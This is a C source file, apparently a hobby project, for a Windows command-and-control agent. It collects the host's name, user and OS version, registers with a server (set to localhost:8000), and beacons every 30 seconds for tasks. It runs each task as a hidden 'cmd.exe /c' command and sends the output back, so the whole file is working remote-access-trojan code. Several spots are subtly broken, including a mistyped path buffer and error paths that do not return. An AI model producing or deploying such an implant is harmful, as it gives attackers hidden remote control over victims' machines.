#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include <winhttp.h>
#include <sysinfoapi.h>

#define BUFFER_SIZE 8192
#define SERVER_NAME L"localhost"
#define SERVER_PORT 8000
#define INTERVAL 30


typedef struct {
    char agent_id[37]; // UUID is 36 bytes, followed by NULL terminator byte.
    char hostname[256];
    char username[256];
    char os_info[256];
} AgentInfo;


/* Agent Initialization and Setup */
void agent_init(AgentInfo* agent) {
    DWORD size = sizeof(agent->hostname);
    GetComputerNameA(agent->hostname, &size);

    size = sizeof(agent->username);
    GetUserNameA(agent->username, &size);

    OSVERSIONINFOEX osInfo;
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((OSVERSIONINFO*)&osInfo);

    size = sizeof(agent->os_info);
    snprintf(agent->os_info, size, "Windows %ld.%ld", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
}


/* HTTP Connection Request Function - Return value = response received */
char* send_connection_request(LPCWSTR method, LPCWSTR path, char* request_data) {

    char* response = NULL;
    DWORD request_size = request_data ? strlen(request_data) : 0; // strlen(NULL) causes segmentation fault, so need to do this

    HINTERNET h_session = NULL, h_connect = NULL, h_request = NULL; // Initializing NULL HINTERNET handles

    // Initialize WinHTTP session
    h_session = WinHttpOpen(L"", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!h_session) {
        printf("[send_connection_request] WinHttpOpen failed!\n");
        return response;
    }

    // Initialize HTTP connection
    h_connect = WinHttpConnect(h_session, SERVER_NAME, SERVER_PORT, 0);

    if (!h_connect) {
        printf("[send_connection_request] WinHttpConnect failed!\n");
        WinHttpCloseHandle(h_session);
        return response;
    }

    // Setup HTTP Request handle // TODO: can last parameter be WINHTTP_FLAG_SECURE or WINHTTP_FLAG_ESCAPE_DISABLE instead of 0?
    h_request = WinHttpOpenRequest(h_connect, method, path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    if (!h_request) {
        printf("[send_connection_request] WinHttpOpenRequest failed!\n");
        WinHttpCloseHandle(h_connect);
        WinHttpCloseHandle(h_request);
        return response;
    }

    // Add Headers to the request
    // if (request_size > 0) WinHttpAddRequestHeaders(h_request, L"Content-Type: application/json\r\n", -1, WINHTTP_ADDREQ_FLAG_ADD);

    // Send HTTP request
    // TODO: Look through all the parameters once!
    if (!WinHttpSendRequest(h_request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)request_data, request_size, request_size, 0)) {
        printf("[send_connection_request] WinHttpSendRequest failed!\n");
        WinHttpCloseHandle(h_request);
        WinHttpCloseHandle(h_connect);
        WinHttpCloseHandle(h_session);
    }

    // TODO: Look through the parameters once!
    if (!WinHttpReceiveResponse(h_request, NULL)) {
        printf("[send_connection_request] WinHttpReceiveResponse failed!\n");
        WinHttpCloseHandle(h_request);
        WinHttpCloseHandle(h_connect);
        WinHttpCloseHandle(h_session);
    }

    DWORD bytes_read = 0, bytes_available = 0, size = 0, total_size = 0;
    char *buffer = NULL;

    do {
        bytes_available = 0;
        if (!WinHttpQueryDataAvailable(h_request, &bytes_available))
            printf("[send_connection_request] WinHttpQueryDataAvailable failed! Error: %d\n", GetLastError());
        if (bytes_available == 0) break;

        buffer = realloc(response, total_size + bytes_available + 1);
        if (!buffer) {
            free(response);
            response = NULL;
            break;
        }
        response = buffer;

        if (!WinHttpReadData(h_request, response + total_size, bytes_available, &bytes_read))
            printf("[send_connection_request] WinHttpReadData failed! Error: %d\n", GetLastError());
        else
            total_size += bytes_read;
    } while (bytes_available > 0);

    if (response)
        response[total_size] = '\0';

    WinHttpCloseHandle(h_request);
    WinHttpCloseHandle(h_connect);
    WinHttpCloseHandle(h_session);

    return response;

}


/* Initial connection to server - register with server and get agent ID - Return value = connection status int */
int connect_to_server(AgentInfo* agent) {

    char request_data[256];
    /*
     * We send the following JSON data in the first connection request:
     * {
     *      "hostname": "<hostname>",
     *      "username": "<username>",
     *      "os_info": "<os_info>"
     * }
     */
    snprintf(request_data, sizeof(request_data),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os_info\":\"%s\"}",
        agent->hostname, agent->username, agent->os_info);

    char* response = send_connection_request(L"POST", L"/agentSetup", request_data);
    if (!response) {
        free(response);
        return 0;
    }
    DWORD response_size = strlen(response);

    char* agent_id_extraction = strstr(response, "agent_id"); // "agent_id":"<>"
    if (!agent_id_extraction) return 0;
    agent_id_extraction += 11; // skipping the following - 'agent_id":"' which is 11 characters
    strncpy(agent->agent_id, agent_id_extraction, 36); // UUID size
    agent->agent_id[36] = '\0'; // NULL terminator byte
    free(response);
    return 1;

}


/* Send beacon to server to receive commands */
char* beacon(AgentInfo* agent) {
    char* path[50];
    snprintf(path, 50, "/beacon/%s", agent->agent_id);
    wchar_t pathW[50];
    mbstowcs(pathW, path, 50);

    char* response = send_connection_request(L"POST", pathW, NULL);
    return response;
}


/* Execute received command */
char* execute_command(char* command) {

    char* output = NULL;
    HANDLE h_read = NULL, h_write = NULL;

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&h_read, &h_write, &sa, 0)) return NULL;

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = h_write;
    si.hStdError = h_write;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    char command_line[1024];
    snprintf(command_line, 1024, "cmd.exe /c %s", command);

    if (!CreateProcessA(NULL, command_line, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(h_read);
        CloseHandle(h_write);
        return NULL;
    }

    CloseHandle(h_write);

    DWORD bytes_available, bytes_read, total_bytes = 0;
    char buf[BUFFER_SIZE];

    while (1) {
        if (!ReadFile(h_read, buf, BUFFER_SIZE - 1, &bytes_read, NULL) || bytes_read == 0)
            break;

        output = realloc(output, total_bytes + bytes_read + 1);
        /*if (!output) {
            free(output);
            break; // TODO: Need an alternative change if realloc fails!!
        }*/

        memcpy(output + total_bytes, buf, bytes_read);
        total_bytes += bytes_read;

        output[total_bytes] = '\0';
    }

    CloseHandle(h_read);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return output;
}


/* Send command output to server */
void send_results(AgentInfo* agent, char* task_id, char* output) {

    if (!output) return;

    const DWORD output_size = strlen(output);

    char result_data[BUFFER_SIZE];

    // Filter the output data for special characters like ", \n, \t, \, \r to prevent errors
    char filtered_output[output_size*2];
    DWORD j = 0;

    for (DWORD i = 0; i < output_size; i++) {
        switch (output[i]) {
            case '\\':
                filtered_output[j++] = '\\';
                filtered_output[j++] = '\\';
                break;
            case '"':
                filtered_output[j++] = '\\';
                filtered_output[j++] = '"';
                break;
            case '\n':
                filtered_output[j++] = '\\';
                filtered_output[j++] = 'n';
                break;
            case '\t':
                filtered_output[j++] = '\\';
                filtered_output[j++] = 't';
                break;
            case '\r':
                filtered_output[j++] = '\\';
                filtered_output[j++] = 'r';
                break;
            default:
                filtered_output[j++] = output[i];
        }
    }
    filtered_output[j] = '\0';
    // result_data is in the format of TaskResult class as defined in server
    snprintf(result_data, BUFFER_SIZE,
        "{\"task_id\":\"%s\",\"agent_id\":\"%s\",\"output\":\"%s\",\"timestamp\":\"%ld\"}",
        task_id, agent->agent_id, filtered_output, (long)time(NULL));

    // TODO: Prevent memory leakage.
    char* response = send_connection_request(L"POST", L"/tasks/result", result_data);

    if (!response) printf("[send_results] Error receiving response\nError code: %d\n", GetLastError());

    char* x = strstr(response, "success");
    if (!x) printf("[send_results] Error sending response\nError code: %d\n", GetLastError());
    free(response);
}


/* Extract the commands from the response received from server */
void command_extraction(AgentInfo* agent, const char* command_info) {

    /* command_info is a json like this:
     * {
     *  "tasksList":[
     *      {"task_id":<task_id>, "command":<command>},
     *      {"task_id":<task_id>, "command":<command>},
     *      ...
     *  ]
     * }
     */

    char* tasks_start_here = strstr(command_info, "tasksList\":[");
    if (!tasks_start_here) return;
    tasks_start_here += 12; // Length of tasksList":[

    // Start an iterator variable to parse through the JSON list of tasks
    char* i = tasks_start_here;

    while (1) {
        i = strstr(i, "{"); // Search for the next available task
        if (!i || *i != '{') break;

        char* task_id_starts_here = strstr(i, "task_id\":\"");
        if (!task_id_starts_here) break;
        task_id_starts_here += 10; // Length of task_id":"

        char task_id[37]; // Length of UUID + NULL terminator
        strncpy(task_id, task_id_starts_here, 36);
        task_id[36] = '\0';

        char* command_starts_here = strstr(i, "command\":\"");
        if (!command_starts_here) break;
        command_starts_here += 10; // Length of command":"

        char* command_ends_here = strstr(command_starts_here, "\"}"); // Look for where the command ends

        DWORD command_size = command_ends_here - command_starts_here; // Calculate the length of the command
        char command[command_size + 1];
        strncpy(command, command_starts_here, command_size);
        command[command_size] = '\0';

        char* output = execute_command(command); // TODO: how to prevent memory leakage in this case?
        if (!output) {
            free(output);
            break;
        }

        send_results(agent, task_id, output);
        free(output);
        i = command_ends_here;
    }
}


/* Main Function */
void main() {

    AgentInfo agent;
    agent_init(&agent); // Initialize the agent with system details

    /* Keep trying to connect to server until it is successful */
    int connection_status = 0;
    while (connection_status == 0) {
        connection_status = connect_to_server(&agent);
    }

    while (1) {

        char* command_info = beacon(&agent);

        if (command_info)
            command_extraction(&agent, command_info);
        free(command_info);

        /* Beacon request set to continue after a standard interval period */
        Sleep(1000 * INTERVAL);
    }
}